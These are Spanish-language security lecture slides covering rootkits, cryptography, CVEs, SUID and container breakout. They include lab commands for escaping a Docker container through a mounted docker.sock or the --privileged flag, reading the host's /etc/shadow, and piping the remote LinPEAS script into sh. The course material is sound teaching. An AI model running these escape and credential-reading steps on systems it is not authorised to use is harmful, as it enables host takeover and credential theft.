Taxonomía · Sesión 224 / 22
Bloque conceptual A · Amenazas de bajo nivel

Rootkit

Malware diseñado para operar en Ring 0 (Kernel). Puede falsificar la salida de ps, ls y los antivirus porque se ejecuta debajo de ellos. Una vez instalado, el sistema no es de fiar: toda información que entregue puede ser manipulada.

Primer uso — Ring 0: zona del procesador donde corre el kernel con acceso total al hardware.

Spyware / Keylogger

Opera en Ring 3 (espacio de usuario) con permisos de lectura amplios. Registra teclas, capturas de pantalla y credenciales, enviándolas a un servidor externo de Command & Control (C2). No necesita escalar privilegios para ser devastador.

Primer uso — Ring 3: zona donde corren aplicaciones ordinarias, sin acceso directo al hardware.

Anillos de privilegio · Sesión 226 / 22
Bloque conceptual B · Easter Eggs en software

Huevos de Pascua: código oculto no auditado

Easter Egg: funcionalidad no documentada introducida deliberadamente por un desarrollador dentro de software legítimo (SO, firmware, aplicación).

  • Origen: Atari 1979 — programador escondió su nombre para evadir política de no-créditos.
  • Ejemplos: Juego 3D en Excel 97, simulador de vuelo en Excel 2000, pantallas ocultas en Windows XP.
  • Riesgo real: Si un desarrollador puede ocultar un juego, puede ocultar una backdoor. El código no está auditado, ni probado, ni documentado.

Principio violado

Código mínimo necesario: un sistema seguro no debe contener más código del estrictamente requerido para su función. Todo código adicional es superficie de ataque adicional.

Los Easter Eggs complican auditorías de seguridad y generan responsabilidad legal si son explotados.

Bloque conceptual C · Fundamentos de criptografía

Los tres pilares matemáticos de la seguridad moderna

Hash (Función de resumen)

Transforma cualquier dato en una cadena de longitud fija. Es unidireccional: no se puede revertir. Un solo bit cambiado produce un hash completamente distinto. Sirve para verificar integridad.

Ej: SHA-256, MD5 (obsoleto)

Cifrado simétrico

La misma clave cifra y descifra. Muy rápido. Problema: ¿cómo compartes la clave sin que alguien la intercepte en tránsito?

Ej: AES-256 — estándar para cifrado en reposo

Cifrado asimétrico

Par de claves: pública (cifrar, compartir libremente) y privada (descifrar, nunca compartir). Resuelve el problema del intercambio de claves.

Ej: RSA, Ed25519 — base de TLS/SSH

Criptografía · Sesión 228 / 22
Recurso visual B · Hash: verificación de integridad

¿Por qué publicar el SHA-256 de una ISO?

Si un atacante intercepta la descarga e inyecta malware en la imagen, el hash resultante será completamente diferente. El receptor detecta la manipulación antes de instalar.

# Verificar integridad en Linux: $ sha256sum ubuntu-24.04.iso # Compara con el hash oficial en ubuntu.com # En Windows PowerShell: > Get-FileHash ubuntu-24.04.iso -Algorithm SHA256

Propiedad avalanche

Un solo carácter modificado en el archivo de entrada produce un hash totalmente distinto — no similar, sino radicalmente diferente. Esto hace imposible falsificar un hash sin tener la clave.

Los sistemas operativos verifican hashes de sus propios binarios para detectar rootkits que hayan modificado archivos del sistema.

Bloque conceptual C · Cifrado asimétrico aplicado

SSH: autenticación sin contraseña

  • Se genera un par: id_ed25519 (privada, solo el usuario) y id_ed25519.pub (pública, se deposita en el servidor).
  • El servidor cifra un desafío con la clave pública. Solo la clave privada puede descifrarlo — sin transmitir la contraseña.
  • Un atacante que intercepte el canal solo ve texto cifrado ilegible.
# Generar par de claves Ed25519: $ ssh-keygen -t ed25519 -C "correo@ejemplo.com" # Depositar clave pública en el servidor: $ ssh-copy-id usuario@servidor.com # Conectarse sin contraseña: $ ssh usuario@servidor.com

Bloque conceptual D · Superficie de ataque

Attack Surface: ¿por dónde entra el atacante?

Superficie de ataque es el conjunto de todos los puntos donde un sistema expone funcionalidad al exterior. A mayor superficie, mayor probabilidad de encontrar una vulnerabilidad explotable.

Vectores de red

Puertos expuestos: 22 (SSH), 80/443 (HTTP/S), bases de datos abiertas. Cada servicio escuchando es una puerta potencial.

Librerías desactualizadas

Código con CVEs conocidos en memoria. Un atacante que identifique la versión puede usar un exploit público en minutos.

Mala configuración

Permisos excesivos asignados por descuido o por defecto. La mayoría de los incidentes reales tienen este origen.

Motor de virtualización

Si dockerd o el kubelet es vulnerable, todos sus contenedores hijos están en riesgo aunque cada uno esté bien configurado.

Superficie de ataque · Sesión 2211 / 22
Bloque conceptual D · CVE y vulnerabilidades 0-Day

CVE — Common Vulnerabilities and Exposures

CVE es el diccionario global de vulnerabilidades de software mantenido por MITRE. Cada vulnerabilidad registrada recibe un identificador único como CVE-2022-0492.

  • Los administradores cruzan la lista semanal de CVEs contra los sistemas de su empresa.
  • Zero-Day (0-Day): vulnerabilidad de la que el fabricante aún no tiene conocimiento — no existe parche al momento del ataque.
  • Buffer Overflow: exceder deliberadamente una variable en RAM para reescribir memoria adyacente y forzar ejecución de código arbitrario (shellcode).

CVE-2022-0492

Vulnerabilidad en la implementación de Cgroups v1 del Kernel Linux. Permitía a un contenedor sin privilegios especiales escapar al sistema host manipulando el subsistema de control de recursos.

Publicado en Febrero 2022. Afectó kernels 2.6.24 a 5.16.2.

CVE · Sesión 2212 / 22
Bloque conceptual E · Escalamiento de privilegios

Remoto — RCE (Remote Code Execution)

El atacante ejecuta código desde internet sin tener cuenta en la máquina. Ejemplo: inyección en una aplicación PHP que fuerza la ejecución de comandos del servidor web.

Punto de entrada: aplicación expuesta a la red.

Local — LPE (Local Privilege Escalation)

El atacante ya está dentro del sistema (como usuario ordinario o dentro de un contenedor). Su objetivo: pasar de uid=1000 (www-data) a uid=0 (root).

Mecanismos: binarios SUID, sudo mal configurado, exploit de kernel.

Cadena típica: RCE inicial → shell de usuario bajo privilegio → LPE → root en contenedor → Container Breakout → root en host físico.

Escalamiento · Sesión 2213 / 22
Bloque conceptual E · Bit SUID

Set User ID (SUID) — poder heredado del dueño

SUID es un bit de permiso en Linux. Cuando está activo en un ejecutable, el programa corre con los permisos del dueño del archivo (normalmente root), no del usuario que lo lanza.

Uso legítimo: passwd necesita escribir en /etc/shadow (solo root), pero cualquier usuario lo ejecuta. El SUID permite esto de forma controlada.

Uso malicioso: si un binario con SUID root permite inyectar comandos, el atacante ejecuta código arbitrario como root.

# Buscar binarios SUID en todo el sistema: $ find / -perm -u=s -type f 2>/dev/null # Salida esperada (legítimos): /usr/bin/passwd /usr/bin/sudo /usr/bin/su # Si aparece /tmp/shell o /usr/local/bin/curl → alerta

Práctica 1 · Sesión 2215 / 22
Bloque conceptual F · Container Breakout

Fracturar los namespaces

Container Breakout es el conjunto de técnicas para salir del entorno de aislamiento de un contenedor y obtener control del host real.

Escenario típico: un atacante explota una vulnerabilidad en la aplicación web dentro del contenedor, obtiene una shell, y descubre que está dentro de un contenedor — no del servidor real.

  • El objetivo pasa de comprometer la app a comprometer el host.
  • Señal de que estás en un contenedor: PID máximo bajo (<20), ausencia de usuarios reales, /.dockerenv presente.

¿Qué se gana al escapar?

Acceso al sistema de archivos real del host, a todos los demás contenedores corriendo, y posiblemente a la red corporativa interna detrás del servidor.

Container Breakout · Sesión 2216 / 22
Bloque conceptual F · Vector 1: Docker socket montado

Montar /var/run/docker.sock en un contenedor

Algunos equipos montan el socket Unix del daemon Docker dentro de un contenedor (ej: Jenkins CI/CD) para que pueda lanzar otros contenedores:

docker run -v /var/run/docker.sock:/var/run/docker.sock jenkins

El error: esto le da al contenedor la llave directa del dockerd padre. Desde adentro, el contenedor puede comandar al daemon que lo enjauló.

# Paso 1: desde el contenedor comprometido, # ordenar al daemon host listar contenedores: $ docker -H unix:///var/run/docker.sock ps # Paso 2: lanzar nuevo contenedor que monte # la raíz completa del host: $ docker -H unix:///var/run/docker.sock run \ -it -v /:/host debian chroot /host /bin/bash # Resultado: shell con acceso total al host real

Bloque conceptual F · Vector 2: flag --privileged

El flag que desactiva todos los controles

--privileged desactiva Cgroups de seguridad, SecComp y los perfiles de AppArmor. Extiende todas las Linux Capabilities al contenedor, incluyendo CAP_SYS_ADMIN.

Un desarrollador lo usa para resolver errores de permisos sin entender las consecuencias. En producción es inadmisible.

# Lanzar contenedor con privilegios totales: $ docker run -d --name jaula --privileged ubuntu sleep 9000 $ docker exec -it jaula bash # Dentro del contenedor: montar el disco real del host $ fdisk -l | grep dev $ mkdir /escape $ mount /dev/sda1 /escape # Acceder a los archivos reales del servidor: $ ls -la /escape/home/ $ cat /escape/etc/shadow
--privileged · Sesión 2218 / 22
Práctica en clase 2 · Análisis forense de procesos

Detectar señales de actividad maliciosa activa

Enunciado: en un sistema Linux, identificar procesos y conexiones de red que presenten señales de alerta características de malware activo.

  1. Ver procesos con CPU alta: ps aux --sort=-%cpu | head -10
  2. Ver conexiones de red activas: ss -tunap
  3. Buscar archivos modificados recientemente en /etc/: find /etc -newer /etc/passwd -type f

Señales de alerta

  • Proceso con nombre genérico (kworker) consumiendo CPU sin razón
  • Conexiones salientes a IPs desconocidas en puertos inusuales
  • Servicios habilitados que el administrador no instaló

Práctica 2 · Sesión 2219 / 22
Recurso visual C · Herramientas de reconocimiento automatizado

LinPEAS — Linux Privilege Escalation Awesome Script

Los analistas de seguridad no ejecutan find SUID manualmente. Usan scripts orquestados que en segundos escanean:

  • Versión del kernel y CVEs activos
  • Binarios SUID/GUID inusuales
  • Sockets expuestos (docker.sock, DBs sin auth)
  • Configuraciones de sudo que permiten escalamiento
  • Credenciales en texto plano en archivos de configuración

LinPEAS colorea en rojo los vectores de alto impacto y en amarillo los de riesgo medio.

Uso en entorno controlado

# Descargar y ejecutar en contenedor de laboratorio: $ curl -L https://github.com/peass-ng/PEASS-ng/\ releases/latest/download/linpeas.sh | sh

Solo en sistemas propios o laboratorios autorizados. Ejecutarlo en sistemas ajenos sin permiso es ilegal.

Síntesis técnica

Resumen de la sesión

Malware: Virus, gusanos, troyanos y ransomware se propagan de formas distintas. Rootkits operan en Ring 0 y falsifican la realidad del sistema. Spyware exfiltra datos desde Ring 3.

Easter Eggs: Código no auditado en software legítimo. Violan el principio de código mínimo y representan potencial backdoor.

Criptografía: Hash (integridad unidireccional), AES-256 (confidencialidad simétrica), Ed25519/RSA (intercambio seguro de claves). SSH usa asimétrico para autenticar sin contraseña.

Container Breakout: Montar docker.sock o usar --privileged en producción es equivalente a entregar las llaves del servidor físico al primer proceso comprometido.
